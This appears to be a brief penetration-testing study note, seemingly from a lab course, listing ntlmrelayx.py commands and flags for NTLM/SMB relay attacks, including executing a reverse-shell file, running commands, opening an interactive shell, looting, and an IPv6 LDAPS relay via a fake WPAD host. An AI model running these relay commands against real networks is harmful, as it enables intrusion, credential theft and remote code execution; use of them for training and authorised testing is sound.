
# ntlmrelayx.py
```bash
ntlmrelayx.py -tf targets.txt -smb2support

-e # to execute a file (msfvenom rev shell etc.)
-c # command (e.g. whoami)
-6 # for IPv6
-t # target 
-l # loot
# Getting interactive shell
-i # for interactive shell


ntlmrelayx.py -6 -t ldaps://IP -wh  fakewpad.marvel.local -l lootme # IPv6 ldaps attack e.g

-w # wpad
```
---
Tags: #smb_relay #impackets 